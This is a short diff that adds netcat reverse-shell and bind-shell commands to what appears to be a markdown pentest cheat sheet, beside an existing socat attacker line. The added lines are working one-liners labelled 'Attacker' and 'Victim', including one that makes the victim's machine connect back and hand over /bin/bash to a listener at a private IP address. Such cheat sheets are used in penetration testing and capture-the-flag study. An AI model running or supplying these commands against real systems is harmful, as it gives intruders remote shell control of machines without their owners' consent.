@@ -26,3 +26,12 @@ From victim machine we have to cert .pem file we can generate certificate and tr
 **Attacker:**  `socat - OPENSSL:VICTIMIP:4443,verify=0`<br>
 
 
+# Netcat
+## Reverse shell<br>
+**Attacker:** `nc -lvnp 4444`<br>
+**Victim:** `nc 192.168.0.107 4444 -e /bin/bash`<br>
+
+## Bind shell
+**Victim:** `nc -lvp 4444 -e /bin/bash`<br>
+**Attacker:** `nc 192.168.0.106 4444`<br>
+
